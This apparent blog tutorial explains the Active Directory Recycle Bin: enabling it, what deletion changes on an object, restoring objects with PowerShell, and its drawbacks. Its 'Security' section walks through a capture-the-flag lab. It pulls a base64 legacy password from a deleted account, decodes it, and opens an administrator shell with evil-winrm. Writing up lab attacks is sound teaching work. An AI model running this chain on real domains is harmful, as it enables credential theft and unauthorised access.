### Introduction
The Active Directory Recycle Bin enables users to recover deleted Active Directory objects without having to restore them from backup, restart Active Directory Domain Services or reboot domain controllers (DCs).

#### 1. Enabling Active Directory Recycle Bin 
```powershell
Import-Module ActiveDirectory

Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=DOMAIN,DC=com’ –Scope ForestOrConfigurationSet –Target ‘DOMAIN.com’
```
For now, you can leverage PowerShell cmdlets, Get-ADObject and Restore-ADObject.
With PowerShell, half the battle is knowing which cmdlets perform certain actions.

#### 2. Deleted objects, object changed from the original version to Recycle Bin
While the Recycle Bin preserves more object attributes than a tombstone, a restored object is not identical to the original object. For example, here is the data of one of the original objects.
![alt text](https://blog.netwrix.com/wp-content/uploads/2021/11/Picture5.png.webp)

The object after the deletion.
![alt text](https://blog.netwrix.com/wp-content/uploads/2021/11/Picture6.png.webp)

We can notice some of the main difference.
- **The object has been moved.** The object has been moved into the partition’s Deleted Objects container.
- **The object has been renamed.** The object’s name has been updated using the Common-Name DEL:Object-Guid.
- **The object possesses some new attributes.** The isDeleted attribute has a value of TRUE and the lastKnownParent attribute is populated. A new attribute, msDS-LastKnownRDN, is populated with the object’s last known relative distinguished name (this attribute allows the Recycle Bin to properly reset an object’s RDN during its restoration, even if the object’s renaming resulted in the truncation of the original RDN).
- **Two attributes have been removed.** Two attributes, objectCategory and sAMAccountType, are always removed from an object when it is deleted. If the object is recovered, the objectCategory value is automatically set to the most specific value in the object’s objectClass attribute and the sAMAccountType value is calculated from the value of either the userAccountControl (for user objects) or groupType attribute (for group objects).


####  3. Restoring deleted items
```powershell
Import-module ActiveDirectory

Get-ADObject -Filter {String} -IncludeDeletedObjects | Restore-ADObject

Examples:
Get-ADObject -Filter { SAMAccountName –eq “securityedu” } -IncludeDeletedObjects
Get-ADObject -Filter { DisplayName –like “*nguye5tn*” } -IncludeDeletedObjects
```
Once you found the objects you want to restore, just pipe the first command to “|Restore-ADObject”
Examples:
```powershell
Get-ADObject -Filter { SAMAccountName –eq “securityedu” } -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter { DisplayName –like “*nguye5tn*” } -IncludeDeletedObjects  | Restore-ADObject
```

#### 4. Drawbacks to the Active Directory Recycle Bin
While the Recycle Bin dramatically simplifies object recovery, we have seen a couple of limitations: Objects are kept for only a fairly short period of time and some of their attributes are lost. There are a couple of additional drawbacks to the Recycle Bin:

- **Enabling the Active Directory Recycle Bin involves a schema change.** Therefore, once you turn the Recycle Bin on you can’t turn it off without a full-forest recovery.
- **Active Directory is going to be a little bigger.** After enabling the AD Recycle Bin, deleted objects will retain far more of their attributes and persist longer than tombstones. As a result, Active Directory will likely use a little more space than it did before.
- **Enabling the Recycle Bin deletes all tombstones.** The most impactful consequence of enabling the Recycle Bin is that all tombstone objects in the forest will immediately cease to exist. Many admins have learned about this consequence the hard way.

### Security
There will be time when there are sensitive fields in deleted objects that could help hackers to leverage it for malicious usage.
For example, if the administrator decides to add some legacy password into the account object information that can be easily retrieved through LDAP technique.
```powershell
PS C:\Users\arksvc\Documents> Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
LegacyPwd                       : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```
We can see there is a field call LegacyPwd that can be used for the users password. The password can be decoded with base64.
```bash
echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```
This can be used to login for future attacks.
```powershell
evil-winrm -u 'administrator' -p 'baCT3r1aN00dles' -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### References
AD recycle bin theory: https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/#:~:text=The%20Active%20Directory%20Recycle%20Bin,reboot%20domain%20controllers%20(DCs).

Managing AD Recycle bin: https://adsecurity.org/?p=51

Exploiting AD Recycle bin: https://blog.raw.pm/en/HackTheBox-Cascade-write-up/
